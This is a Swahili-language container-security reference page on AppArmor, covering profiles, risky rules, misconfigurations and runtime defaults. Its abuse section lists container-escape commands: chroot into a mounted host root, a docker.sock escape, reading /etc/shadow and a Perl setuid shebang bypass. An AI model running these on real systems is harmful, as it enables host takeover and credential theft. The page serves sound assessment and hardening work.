# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

AppArmor ni mfumo wa **Mandatory Access Control** unaoweka vizuizi kupitia profiles za kila program. Tofauti na ukaguzi wa kawaida wa DAC, ambao hutegemea sana umiliki wa user na group, AppArmor huwezesha kernel kutekeleza policy iliyounganishwa na process yenyewe. Katika mazingira ya containers, hili ni muhimu kwa sababu workload inaweza kuwa na privilege ya kawaida ya kutosha kujaribu kitendo fulani, lakini bado ikakataliwa kwa sababu AppArmor profile yake hairuhusu path, mount, tabia ya network, au matumizi ya capability husika.

Jambo muhimu zaidi la kuelewa ni kwamba AppArmor inategemea **path**. Huchanganua ufikiaji wa filesystem kupitia rules za path badala ya labels kama SELinux. Hilo huifanya iwe rahisi kueleweka na yenye nguvu, lakini pia linamaanisha kuwa bind mounts na mipangilio mbadala ya path zinahitaji kuangaliwa kwa makini. Ikiwa content ileile ya host inaweza kufikiwa kupitia path tofauti, matokeo ya policy huenda yasiwe yale operator aliyotarajia mwanzoni.

## Jukumu Katika Container Isolation

Ukaguzi wa container security mara nyingi huishia kwenye capabilities na seccomp, lakini AppArmor bado ni muhimu baada ya ukaguzi huo. Fikiria container yenye privilege zaidi ya inavyopaswa kuwa, au workload iliyohitaji capability moja ya ziada kwa sababu za kiutendaji. AppArmor bado inaweza kuzuia file access, tabia ya mount, networking, na execution patterns kwa njia zinazozuia abuse path iliyo wazi. Ndiyo maana kuzima AppArmor "ili tu application ifanye kazi" kunaweza kubadilisha kimya kimya configuration yenye risk tu kuwa configuration inayoweza ku-exploitwa moja kwa moja.

## Lab

Ili kuangalia kama AppArmor iko active kwenye host, tumia:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Ili kuona mchakato wa sasa wa container unaoendeshwa chini ya:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Tofauti hiyo ni ya kufundisha. Katika hali ya kawaida, mchakato unapaswa kuonyesha muktadha wa AppArmor unaohusishwa na profile iliyochaguliwa na runtime. Katika hali ya unconfined, safu hiyo ya ziada ya vizuizi huondoka.

Unaweza pia kukagua kile ambacho Docker inaona kuwa ilikitumia:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Matumizi ya Runtime

Docker inaweza kutumia AppArmor profile ya default au custom wakati host inaiunga mkono. Podman pia inaweza kuunganishwa na AppArmor kwenye mifumo inayotumia AppArmor, ingawa kwenye distributions zinazotanguliza SELinux, mfumo mwingine wa MAC mara nyingi huwa wa msingi. Kubernetes inaweza kuweka wazi AppArmor policy katika kiwango cha workload kwenye nodes zinazoiunga mkono AppArmor. LXC na mazingira yanayohusiana ya system-container ya familia ya Ubuntu pia hutumia AppArmor kwa kiwango kikubwa.

Jambo la msingi ni kwamba AppArmor si "Docker feature". Ni host-kernel feature ambayo runtimes kadhaa zinaweza kuchagua kutumia. Ikiwa host haiiungi mkono au runtime imeelekezwa iendeshe ikiwa unconfined, ulinzi unaodhaniwa haupo kwa kweli.

Kwa Kubernetes hasa, API ya kisasa ni `securityContext.appArmorProfile`. Tangu Kubernetes `v1.30`, AppArmor annotations za zamani za beta zimepitwa na wakati. Kwenye hosts zinazoiunga mkono, `RuntimeDefault` ndiyo default profile, huku `Localhost` ikiashiria profile ambayo lazima iwe tayari imepakiwa kwenye node. Hili ni muhimu wakati wa review kwa sababu manifest inaweza kuonekana kuwa inatambua AppArmor, huku kwa kweli ikitegemea kabisa support ya node na profiles zilizopakiwa mapema.

Jambo moja la kiutendaji, lisilo dhahiri lakini muhimu, ni kwamba kuweka wazi `appArmorProfile.type: RuntimeDefault` kuna masharti makali zaidi kuliko kuacha field hiyo bila kuwekwa. Ikiwa field imewekwa wazi na node haiungi mkono AppArmor, admission inapaswa kushindikana. Ikiwa field imeachwa bila kuwekwa, workload bado inaweza kuendeshwa kwenye node isiyo na AppArmor na isiipokee hiyo layer ya ziada ya confinement. Kwa mtazamo wa attacker, hii ni sababu nzuri ya kukagua manifest pamoja na hali halisi ya node.

Kwenye Docker-capable AppArmor hosts, default inayojulikana zaidi ni `docker-default`. Profile hiyo hutengenezwa kutoka kwenye AppArmor template ya Moby na ni muhimu kwa sababu inaeleza kwa nini baadhi ya capability-based PoCs bado hushindwa katika container ya default. Kwa ujumla, `docker-default` inaruhusu networking ya kawaida, inakataza writes kwenye sehemu kubwa ya `/proc`, inakataza access kwenye sehemu nyeti za `/sys`, inazuia mount operations, na inaweka mipaka kwenye ptrace ili isiwe general host-probing primitive. Kuelewa baseline hiyo husaidia kutofautisha "container ina `CAP_SYS_ADMIN`" na "container inaweza kweli kutumia capability hiyo dhidi ya kernel interfaces ninazozihitaji".

## Usimamizi wa Profile

AppArmor profiles kwa kawaida huhifadhiwa chini ya `/etc/apparmor.d/`. Naming convention ya kawaida ni kubadilisha slashes katika executable path kuwa dots. Kwa mfano, profile ya `/usr/bin/man` kwa kawaida huhifadhiwa kama `/etc/apparmor.d/usr.bin.man`. Maelezo haya ni muhimu katika defense na assessment kwa sababu ukijua jina la active profile, mara nyingi unaweza kupata file linalolingana kwa haraka kwenye host.

Useful host-side management commands zinajumuisha:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Sababu ya amri hizi kuwa muhimu katika marejeo ya container-security ni kwamba zinaeleza jinsi profiles zinavyoundwa, kupakiwa, kubadilishwa kuwa complain mode, na kurekebishwa baada ya mabadiliko ya application. Ikiwa operator ana tabia ya kuhamisha profiles kwenda complain mode wakati wa troubleshooting na kusahau kurejesha enforcement, container inaweza kuonekana kuwa imelindwa kwenye documentation huku kiuhalisia ikifanya kazi kwa vizuizi hafifu zaidi.

### Kuunda Na Kusasisha Profiles

`aa-genprof` inaweza kuchunguza tabia ya application na kusaidia kuunda profile kwa njia ya maingiliano:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` inaweza kutengeneza template profile ambayo baadaye inaweza kupakiwa kwa `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Wakati binary inabadilika na policy inahitaji kusasishwa, `aa-logprof` inaweza kucheza tena denials zilizopatikana kwenye logs na kumsaidia operator kuamua ikiwa aziruhusu au azikatae:
```bash
sudo aa-logprof
```
### Logs

AppArmor denials mara nyingi huonekana kupitia `auditd`, syslog, au tools kama `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Hii ni muhimu kwa matumizi ya kiutendaji na ya mashambulizi. Defenders huitumia kuboresha profiles. Attackers huitumia kujua ni path au operation gani hasa inazuiwa na kama AppArmor ndiyo control inayozuia exploit chain.

### Kutambua Faili Halisi ya Profile

Runtime inapoonyesha jina maalum la AppArmor profile kwa container, mara nyingi huwa muhimu kuhusisha jina hilo na faili ya profile iliyo kwenye disk:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Hii ni muhimu hasa wakati wa ukaguzi wa host, kwa sababu inaunganisha pengo kati ya "container inasema inaendeshwa chini ya profile `lowpriv`" na "rules halisi ziko kwenye file hii maalum ambayo inaweza kukaguliwa au kupakiwa upya".

### Rules Muhimu Za Kukagua

Unapoweza kusoma profile, usiishie kwenye mistari rahisi ya `deny`. Aina kadhaa za rules hubadilisha kwa kiasi kikubwa jinsi AppArmor itakavyokuwa na manufaa dhidi ya jaribio la container escape:

- `ux` / `Ux`: huendesha target binary ikiwa unconfined. Ikiwa helper, shell, au interpreter inayoweza kufikiwa inaruhusiwa chini ya `ux`, kwa kawaida hicho ndicho kitu cha kwanza cha ku-test.
- `px` / `Px` na `cx` / `Cx`: hufanya profile transitions wakati wa exec. Hizi si mbaya moja kwa moja, lakini zinafaa kukaguliwa kwa sababu transition inaweza kuishia kwenye profile yenye ruhusa pana zaidi kuliko ya sasa.
- `change_profile`: huruhusu task kubadilisha na kuingia kwenye profile nyingine iliyopakiwa, mara moja au kwenye exec inayofuata. Ikiwa destination profile ni dhaifu zaidi, hii inaweza kuwa intended escape hatch kutoka kwenye domain yenye restrictions.
- `flags=(complain)`, `flags=(unconfined)`, au `flags=(prompt)` mpya zaidi: hizi zinapaswa kubadilisha kiwango cha trust unachoweka kwenye profile. `complain` hu-log denials badala ya kuzitekeleza, `unconfined` huondoa boundary, na `prompt` hutegemea userspace decision path badala ya deny inayotekelezwa moja kwa moja na kernel.
- `userns` au `userns create,`: AppArmor policy za kisasa zaidi zinaweza kudhibiti uundaji wa user namespaces. Ikiwa container profile inairuhusu waziwazi, nested user namespaces bado zinabaki kuwa sehemu ya attack surface hata platform inapotumia AppArmor kama sehemu ya hardening strategy.

Grep muhimu upande wa host:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Aina hii ya audit mara nyingi huwa na manufaa zaidi kuliko kutazama mamia ya rules za kawaida za faili. Ikiwa breakout inategemea kutekeleza helper, kuingia kwenye namespace mpya, au kutoroka kwenda kwenye profile yenye vikwazo vichache, jibu mara nyingi limefichwa katika rules hizi zinazohusiana na transition badala ya mistari iliyo wazi ya mtindo wa `deny /etc/shadow r`.

## Misconfigurations

Kosa lililo wazi zaidi ni `apparmor=unconfined`. Administrators mara nyingi huiweka wakati wa kufanya debugging ya application iliyoshindwa kwa sababu profile ilizuia kwa usahihi kitu hatari au kisichotarajiwa. Ikiwa flag hiyo itabaki production, layer nzima ya MAC huwa imeondolewa kwa ufanisi.

Tatizo jingine lisilo wazi sana ni kudhani kwamba bind mounts hazina madhara kwa sababu file permissions zinaonekana kuwa za kawaida. Kwa kuwa AppArmor inategemea paths, ku-expose host paths chini ya mount locations mbadala kunaweza kuingiliana vibaya na path rules. Kosa la tatu ni kusahau kwamba jina la profile katika config file lina maana ndogo sana ikiwa host kernel haitumii AppArmor kwa enforce halisi.

## Abuse

AppArmor inapokuwa imeondolewa, operations ambazo awali zilikuwa zimewekewa vikwazo zinaweza kuanza kufanya kazi ghafla: kusoma sensitive paths kupitia bind mounts, kufikia sehemu za procfs au sysfs ambazo zilipaswa kuwa ngumu zaidi kutumia, kufanya mount-related actions ikiwa capabilities/seccomp pia zinaruhusu, au kutumia paths ambazo profile kwa kawaida ingekataa. AppArmor mara nyingi ndiyo mechanism inayoeleza kwa nini jaribio la capability-based breakout linaonekana kama "should work" kwenye karatasi lakini bado linashindwa kwa vitendo. Ondoa AppArmor, na jaribio hilo hilo linaweza kuanza kufanikiwa.

Ikiwa unashuku kwamba AppArmor ndiyo kitu kikuu kinachozuia path-traversal, bind-mount, au mount-based abuse chain, hatua ya kwanza kwa kawaida ni kulinganisha kile kinachoweza kufikiwa ukiwa na profile na bila profile. Kwa mfano, ikiwa host path ime-mount ndani ya container, anza kwa kuangalia ikiwa unaweza ku-traverse na kuisoma:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Ikiwa container pia ina capability hatari kama `CAP_SYS_ADMIN`, mojawapo ya tests za kiutendaji zaidi ni kubaini ikiwa AppArmor ndiyo control inayozuia mount operations au ufikiaji wa kernel filesystems nyeti:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Katika mazingira ambapo path ya host tayari inapatikana kupitia bind mount, kupoteza AppArmor kunaweza pia kubadilisha issue ya information disclosure ya read-only kuwa ufikiaji wa moja kwa moja wa faili za host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Lengo la commands hizi si kwamba AppArmor pekee ndiyo huunda breakout. Ni kwamba baada ya AppArmor kuondolewa, njia nyingi za abuse zinazotegemea filesystem na mount zinaweza kujaribiwa mara moja.

### Mfano Kamili: AppArmor Imezimwa + Host Root Imewekwa Mount

Ikiwa container tayari ina host root iliyowekwa bind-mounted kwenye `/host`, kuondoa AppArmor kunaweza kubadilisha njia ya abuse ya filesystem iliyokuwa imezuiwa kuwa host escape kamili:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Mara shell inapoanza kutekelezwa kupitia filesystem ya host, workload kwa ufanisi imevuka mpaka wa container:
```bash
id
hostname
cat /etc/shadow | head
```
### Mfano Kamili: AppArmor Disabled + Runtime Socket

Ikiwa kizuizi halisi kilikuwa AppArmor inayolinda hali ya runtime, socket iliyomountiwa inaweza kutosha kwa escape kamili:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Njia halisi inategemea mount point, lakini matokeo ya mwisho ni yale yale: AppArmor haizuii tena ufikiaji wa runtime API, na runtime API inaweza kuzindua container inayoweza ku-compromise host.

### Full Example: Path-Based Bind-Mount Bypass

Kwa sababu AppArmor inategemea paths, kulinda `/proc/**` hakulindi kiotomatiki maudhui yale yale ya host procfs yanapofikiwa kupitia path tofauti:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Athari inategemea kile hasa kilichowekwa (mounted) na ikiwa njia mbadala pia inapita vidhibiti vingine, lakini muundo huu ni mojawapo ya sababu zilizo wazi zaidi zinazoonyesha kwamba AppArmor lazima ichunguzwe pamoja na mpangilio wa mount badala ya kuchunguzwa peke yake.

### Mfano Kamili: Shebang Bypass

AppArmor policy wakati mwingine hulenga interpreter path kwa njia ambayo haizingatii kikamilifu utekelezaji wa script kupitia ushughulikiaji wa shebang. Mfano wa kihistoria ulihusisha kutumia script ambayo mstari wake wa kwanza unaelekeza kwenye interpreter iliyowekewa vikwazo:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Mfano wa aina hii ni muhimu kama ukumbusho kwamba dhamira ya profile na semantics halisi za utekelezaji zinaweza kutofautiana. Wakati wa kukagua AppArmor katika mazingira ya container, interpreter chains na alternate execution paths zinahitaji uangalifu maalum.

## Ukaguzi

Lengo la ukaguzi huu ni kujibu maswali matatu kwa haraka: je, AppArmor imewezeshwa kwenye host, je, process ya sasa imewekewa confinement, na je, runtime ilitumia profile kwa container hii?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Kinachovutia hapa:

- Ikiwa `/proc/self/attr/current` inaonyesha `unconfined`, workload hainufaiki na AppArmor confinement.
- Ikiwa `aa-status` inaonyesha AppArmor imezimwa au haijapakiwa, jina lolote la profile katika runtime config kwa kiasi kikubwa ni la mapambo tu.
- Ikiwa `docker inspect` inaonyesha `unconfined` au custom profile isiyotarajiwa, mara nyingi hiyo ndiyo sababu filesystem au mount-based abuse path inafanya kazi.
- Ikiwa `/sys/kernel/security/apparmor/profiles` haina profile uliyotarajia, runtime au orchestrator configuration pekee haitoshi.
- Ikiwa supposedly hardened profile ina rules za mtindo wa `ux`, `change_profile` pana, `userns`, au `flags=(complain)`, practical boundary inaweza kuwa dhaifu zaidi kuliko jina la profile linavyoashiria.

Ikiwa container tayari ina elevated privileges kwa sababu za uendeshaji, kuacha AppArmor ikiwa enabled mara nyingi hutofautisha kati ya controlled exception na security failure iliyo pana zaidi.

## Chaguo-msingi za Runtime

| Runtime / platform | Hali ya chaguo-msingi | Tabia ya chaguo-msingi | Kudhoofisha kwa mikono kunakotokea mara kwa mara |
| --- | --- | --- | --- |
| Docker Engine | Imewezeshwa kwa chaguo-msingi kwenye hosts zinazoweza kutumia AppArmor | Hutumia AppArmor profile ya `docker-default` isipokuwa ibadilishwe | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Inategemea host | AppArmor inatumika kupitia `--security-opt`, lakini chaguo-msingi halisi hutegemea host/runtime na si la jumla kama profile ya `docker-default` iliyoandikwa kwa Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Chaguo-msingi la masharti | Ikiwa `appArmorProfile.type` haijabainishwa, chaguo-msingi ni `RuntimeDefault`, lakini hutumika tu AppArmor ikiwa imewezeshwa kwenye node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` yenye weak profile, nodes zisizo na support ya AppArmor |
| containerd / CRI-O chini ya Kubernetes | Hufuata support ya node/runtime | Runtimes zinazotumika na Kubernetes kwa kawaida zina support ya AppArmor, lakini enforcement halisi bado hutegemea support ya node na workload settings | Sawa na row ya Kubernetes; direct runtime configuration pia inaweza kuruka AppArmor kabisa |

Kwa AppArmor, variable muhimu zaidi mara nyingi ni **host**, si runtime pekee. Mpangilio wa profile katika manifest hauundi confinement kwenye node ambayo AppArmor haijawezeshwa.

## Marejeo

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
